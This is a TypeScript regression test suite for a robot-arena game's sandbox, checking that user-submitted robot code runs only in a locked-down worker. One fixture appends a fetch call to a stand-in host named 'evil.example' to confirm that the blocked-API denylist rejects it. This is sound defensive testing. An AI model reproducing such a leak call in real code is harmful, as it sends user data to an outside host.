// Sandbox regression tests: untrusted robot code must never execute in the
// page realm, and the worker-hosted path must still sense and act.
//
// Run with `npm run test:sandbox`:
//   esbuild tools/test-sandbox.ts --bundle --platform=node --format=esm \
//       --outfile=/tmp/robotarena-test-sandbox.mjs --log-level=warning \
//   && node /tmp/robotarena-test-sandbox.mjs
//
// Exits non-zero on any failure. No Math.random / Date.now anywhere.
//
// What runs where: the browser Worker boundary cannot exist in Node, so a
// loopback transport stands in for the worker. It executes the REAL fixture
// source (data: URL import, like the worker's blob import) and mirrors the
// worker's validation + instance protocol, while the host wrapper, the
// import pipeline, and the engine run unmodified. The worker file itself is
// verified by typecheck + production build (separate chunk) and review.

import { readFileSync } from 'fs';
import { importRobotFromText, prepareModuleSource } from '../src/game/importRobot';
import {
    createSandboxHandle,
    createSandboxedController,
    resetSandboxTransportFactory,
    setSandboxTransportFactory,
    validateRobotSourceInWorker,
} from '../src/game/sandboxedRobot';
import {
    dryRunSense,
    looksLikeTypescript,
    rebuildSense,
    validIntent,
    validMeta,
    type HostToWorker,
    type SandboxSnapshot,
    type SandboxTransport,
    type WorkerToHost,
} from '../src/game/robotSandboxProtocol';
import { createRng } from '../src/sim/rng';
import { Match } from '../src/sim/engine';
import type { Intent, RobotController, SenseState } from '../src/sim/types';
import { create as createHunter } from '../src/robots/hunter';

let failures = 0;

function check(name: string, condition: boolean, detail = ''): void {
    if (condition) {
        console.log(`  ok   ${name}`);
    } else {
        failures += 1;
        console.log(`  FAIL ${name}${detail === '' ? '' : ` -- ${detail}`}`);
    }
}

const tick = (): Promise<void> => new Promise((resolve) => setTimeout(resolve, 0));

// --- Fixtures: single-file user-style robots (no imports, plain JS) --------

const CHASER = `export const meta = { id: 'chaser', name: 'Chaser', author: 'test', version: '1.0.0', description: 'test chaser' };
export const loadout = {};
export function create() {
    return { meta, loadout, update(sense) {
        const foe = sense.foes[0];
        if (foe === undefined) return { throttle: 0.6, towerTurn: 0.8, fire: false };
        const self = sense.self;
        const goal = Math.atan2(foe.y - self.y, foe.x - self.x);
        let diff = goal - self.tower;
        while (diff > Math.PI) diff -= Math.PI * 2;
        while (diff < -Math.PI) diff += Math.PI * 2;
        return { throttle: 1, towerTurn: Math.max(-1, Math.min(1, diff * 3)), fire: Math.abs(diff) < 0.07 };
    } };
}
`;

const LATE_THROWER = `export const meta = { id: 'thrower', name: 'Thrower', author: 'test', version: '1.0.0', description: 'throws after tick 5' };
export const loadout = {};
export function create() {
    return { meta, loadout, update(sense) {
        if (sense.tick > 5) throw new Error('boom');
        return { throttle: 0.5, fire: false };
    } };
}
`;

// --- Loopback "worker": same protocol, in-process execution ----------------
// Mirrors robotWorker.ts validation + instance handling; executes fixture
// source via data: URL import (the Node analogue of the worker blob import).

interface LoopbackOptions {
    replyDelayMs?: number;
}

function createLoopbackTransport(options: LoopbackOptions = {}): SandboxTransport & { seenSeeds: number[] } {
    const delay = options.replyDelayMs ?? 0;
    let handler: ((message: WorkerToHost) => void) | null = null;
    let factory: (() => RobotController) | null = null;
    let loadFailed = false;
    const instances = new Map<string, { update: (sense: SenseState) => Intent; spawnFired: boolean }>();
    const queuedSpawns: string[] = [];
    const seenSeeds: number[] = [];

    const emit = (message: WorkerToHost): void => {
        if (delay <= 0) {
            queueMicrotask(() => handler?.(message));
        } else {
            setTimeout(() => handler?.(message), delay);
        }
    };

    const spawn = (instanceId: string): void => {
        if (factory === null && !loadFailed) {
            if (!queuedSpawns.includes(instanceId)) queuedSpawns.push(instanceId);
            return;
        }
        if (factory === null) return;
        try {
            const controller = factory();
            instances.set(instanceId, { update: controller.update.bind(controller), spawnFired: false });
            emit({ type: 'spawned', instanceId });
        } catch {
            emit({ type: 'spawn-error', instanceId, error: 'create() threw' });
        }
    };

    return {
        seenSeeds,
        postMessage(message: HostToWorker): void {
            if (message.type === 'load') {
                void (async () => {
                    try {
                        const url = `data:text/javascript;base64,${Buffer.from(message.code).toString('base64')}`;
                        const module = (await import(url)) as unknown as Record<string, unknown>;
                        const meta = validMeta(module['meta']);
                        if (typeof module['create'] !== 'function' || !meta) {
                            emit({ type: message.dryRun ? 'validate-error' : 'fatal', error: 'bad shape' });
                            return;
                        }
                        const controller = (module['create'] as () => RobotController)();
                        if (typeof controller.update !== 'function') {
                            emit({ type: message.dryRun ? 'validate-error' : 'fatal', error: 'no update' });
                            return;
                        }
                        const intent = controller.update(dryRunSense());
                        if (!validIntent(intent)) {
                            emit({ type: message.dryRun ? 'validate-error' : 'fatal', error: 'bad intent' });
                            return;
                        }
                        if (message.dryRun) {
                            emit({ type: 'validate-ok', meta, loadout: {} });
                            return;
                        }
                        factory = module['create'] as () => RobotController;
                        emit({ type: 'ready' });
                        for (const id of queuedSpawns.splice(0, queuedSpawns.length)) spawn(id);
                    } catch (error) {
                        loadFailed = true;
                        emit({
                            type: message.dryRun ? 'validate-error' : 'fatal',
                            error: error instanceof Error ? error.message : 'unknown',
                        });
                    }
                })();
            } else if (message.type === 'spawn') {
                spawn(message.instanceId);
            } else if (message.type === 'tick') {
                const instance = instances.get(message.instanceId);
                if (!instance) return;
                const snapshot: SandboxSnapshot = structuredClone(message.snapshot);
                seenSeeds.push(snapshot.rng.seed);
                const worker = (): void => {
                    try {
                        const intent = instance.update(rebuildSense(snapshot));
                        emit({ type: 'intent', instanceId: message.instanceId, intent });
                    } catch {
                        emit({ type: 'intent-error', instanceId: message.instanceId, error: 'threw' });
                    }
                };
                if (delay <= 0) queueMicrotask(worker);
                else setTimeout(worker, delay);
            }
        },
        get onmessage() {
            return handler;
        },
        set onmessage(next: ((message: WorkerToHost) => void) | null) {
            handler = next;
        },
        terminate(): void {
            handler = null;
            instances.clear();
        },
    };
}

// --- 1. Page realm never executes user code --------------------------------
console.log('page-realm');
{
    const source = readFileSync('src/game/importRobot.ts', 'utf8');
    check('no blob-URL module loading in page realm', !source.includes('createObjectURL'));
    check('no Blob construction in page realm', !source.includes('new Blob'));
    check('no dynamic import in page realm', !/await import\(/.test(source));
    const host = readFileSync('src/game/sandboxedRobot.ts', 'utf8');
    check('match path loads the worker bundle', host.includes('./robotWorker.ts'));
    const worker = readFileSync('src/game/robotWorker.ts', 'utf8');
    check('worker neuters network APIs', worker.includes("'fetch'") && worker.includes("'WebSocket'"));
    check('worker neuters storage APIs', worker.includes("'indexedDB'"));
    check('worker neuters nested workers', worker.includes("'Worker'"));
}

// --- 2. Static screens ------------------------------------------------------
console.log('screens');
{
    const withTypes = `import type { Intent } from '../sim/types';\nexport const meta = { id: 'a', name: 'a', author: 'a', version: '1', description: 'a' };\nexport const loadout = {};\nexport function create() { return { meta, loadout, update() { return {}; } }; }\n`;
    const stripped = prepareModuleSource(withTypes);
    check('import-type lines are stripped', stripped.ok && !stripped.code.includes('import type'));
    check(
        'value imports are rejected',
        !prepareModuleSource(`import { x } from './common';\n${withTypes}`).ok,
    );
    check(
        'dynamic imports are rejected',
        !prepareModuleSource(`${withTypes}\nconst m = import('x');\nvoid m;\n`).ok,
    );
    check('oversize sources are rejected', !prepareModuleSource(`export const x = '${'y'.repeat(300 * 1024)}';`).ok);
    check('leftover TypeScript is recognized', looksLikeTypescript('function update(sense: SenseState): Intent {'));
    check('plain JS is not TypeScript', !looksLikeTypescript(CHASER));
}

// --- 3. Snapshot / intent protocol ------------------------------------------
console.log('protocol');
{
    const sense = { ...dryRunSense(), rand: createRng(99) };
    const snapshot = {
        ...sense,
        rand: undefined as never,
        rng: { seed: 123, robotId: 2, tick: 7 },
    };
    const { rand: _dropped, ...rest } = snapshot;
    void _dropped;
    check('snapshots structured-clone (no functions)', (() => {
        try {
            structuredClone(rest);
            return !('rand' in rest);
        } catch {
            return false;
        }
    })());
    const rebuilt = rebuildSense({ ...rest, rng: { seed: 123, robotId: 2, tick: 7 } });
    const expected = createRng((123 ^ Math.imul(3, 2654435761) ^ Math.imul(8, 40503)) >>> 0);
    check(
        'worker rand stream matches the host formula',
        rebuilt.rand() === expected() && rebuilt.rand() === expected() && rebuilt.rand() === expected(),
    );
    check('valid intents pass', validIntent({ throttle: 1, fire: true }));
    check('non-numeric intents fail', !validIntent({ throttle: 'fast' }));
    check('non-boolean intents fail', !validIntent({ fire: 1 }));
    check('non-object intents fail', !validIntent(null));
    check('valid metas pass', validMeta({ id: 'a-1', name: 'n', author: 'a', version: 'v', description: 'd' }) !== null);
    check('bad-id metas fail', validMeta({ id: 'A!', name: 'n', author: 'a', version: 'v', description: 'd' }) === null);
}

// --- 4. Import pipeline + validation timeout --------------------------------
console.log('import');
{
    setSandboxTransportFactory(() => createLoopbackTransport());
    try {
        const result = await importRobotFromText(CHASER);
        check('valid source registers', result.ok);
        if (result.ok) {
            check('imported id is namespaced', result.id.startsWith('custom:'));
            check('entry is marked sandboxed', result.robot.sandboxed === true);
            check('entry retains source for match workers', result.robot.source !== undefined);
        }
        const blocked = await importRobotFromText(
            `${CHASER}\nconst leak = fetch('https://evil.example');\nvoid leak;\n`,
        );
        check('blocked APIs fail fast with the denylist message', !blocked.ok && blocked.error.includes('blocked API'));
    } finally {
        resetSandboxTransportFactory();
    }
    // A worker that never answers must reject, never hang the tab.
    setSandboxTransportFactory(() => ({
        postMessage: () => undefined,
        onmessage: null,
        terminate: () => undefined,
    }));
    try {
        let timedOut = '';
        try {
            await validateRobotSourceInWorker('export const meta = {};', 30);
        } catch (error) {
            timedOut = error instanceof Error ? error.message : '';
        }
        check('validation timeout rejects the import', timedOut.includes('timed out'));
    } finally {
        resetSandboxTransportFactory();
    }
}

// --- 5. Headless match through the sandboxed path ---------------------------
console.log('match');
{
    const loopback = createLoopbackTransport();
    setSandboxTransportFactory(() => loopback);
    try {
        const result = await importRobotFromText(CHASER);
        check('chaser imports for the match', result.ok);
        if (result.ok) {
            const sandboxController = result.robot.create();
            const hunter = createHunter();
            const match = new Match(
                [
                    { team: 0, controller: sandboxController, loadout: { ...result.robot.loadout } },
                    { team: 1, controller: hunter, loadout: {} },
                ],
                7,
            );
            const startX = match.robotSnapshots[0]?.x ?? 0;
            const startY = match.robotSnapshots[0]?.y ?? 0;
            // Synchronous steps before any reply: neutral intent held, parked.
            match.step();
            match.step();
            const heldX = match.robotSnapshots[0]?.x ?? -1;
            const heldY = match.robotSnapshots[0]?.y ?? -1;
            check('no reply yet means no movement (held neutral)', heldX === startX && heldY === startY);
            check('no reply processed synchronously', loopback.seenSeeds.length === 0);
            await tick();
            check('worker receives the match seed', loopback.seenSeeds.includes(7));
            // Run to completion, pumping replies between steps.
            let guard = 0;
            while (!match.result.over && guard < 12000) {
                match.step();
                guard += 1;
                await tick();
            }
            check('sandboxed match runs to completion', match.result.over, `guard ${guard}`);
            const snaps = match.robotSnapshots;
            const chaserSnap = snaps[0];
            check('sandboxed robot sensed and acted', (chaserSnap?.shotsFired ?? 0) > 0, `shots ${chaserSnap?.shotsFired ?? -1}`);
            const moved = Math.hypot((chaserSnap?.x ?? 0) - startX, (chaserSnap?.y ?? 0) - startY);
            check('sandboxed robot drove', moved > 50, `moved ${moved.toFixed(1)}`);
        }
    } finally {
        resetSandboxTransportFactory();
    }
}

// --- 6. Match-time thrower parks, the match survives -------------------------
console.log('errors');
{
    setSandboxTransportFactory(() => createLoopbackTransport());
    try {
        const result = await importRobotFromText(LATE_THROWER);
        // Dry run is tick 0: passes, so the import succeeds like before.
        check('late thrower passes the dry run', result.ok);
        if (result.ok) {
            const match = new Match(
                [
                    { team: 0, controller: result.robot.create(), loadout: {} },
                    { team: 1, controller: createHunter(), loadout: {} },
                ],
                11,
            );
            let guard = 0;
            while (!match.result.over && guard < 12000) {
                match.step();
                guard += 1;
                await tick();
            }
            check('throwing robot does not kill the match loop', match.result.over, `guard ${guard}`);
        }
    } finally {
        resetSandboxTransportFactory();
    }
}

// --- 7. Two slots share one worker ------------------------------------------
console.log('sharing');
{
    const shared = createLoopbackTransport();
    setSandboxTransportFactory(() => shared);
    try {
        const result = await importRobotFromText(CHASER);
        check('chaser imports for sharing', result.ok);
        if (result.ok) {
            const handle = createSandboxHandle(result.robot.meta, result.robot.loadout, result.robot.source ?? '');
            const match = new Match(
                [
                    { team: 0, controller: createSandboxedController(handle), loadout: {} },
                    { team: 0, controller: createSandboxedController(handle), loadout: {} },
                    { team: 1, controller: createHunter(), loadout: {} },
                    { team: 1, controller: createHunter(), loadout: {} },
                ],
                21,
            );
            const starts = match.robotSnapshots.slice(0, 2).map((s) => ({ x: s.x, y: s.y }));
            let guard = 0;
            while (!match.result.over && guard < 12000) {
                match.step();
                guard += 1;
                await tick();
            }
            check('shared-worker match completes', match.result.over, `guard ${guard}`);
            const moved = match.robotSnapshots
                .slice(0, 2)
                .every((s, i) => Math.hypot(s.x - (starts[i]?.x ?? 0), s.y - (starts[i]?.y ?? 0)) > 50);
            check('both shared slots acted independently', moved);
        }
    } finally {
        resetSandboxTransportFactory();
    }
}

console.log(failures === 0 ? 'ALL SANDBOX CHECKS PASSED' : `${failures} SANDBOX CHECK(S) FAILED`);
process.exit(failures === 0 ? 0 : 1);
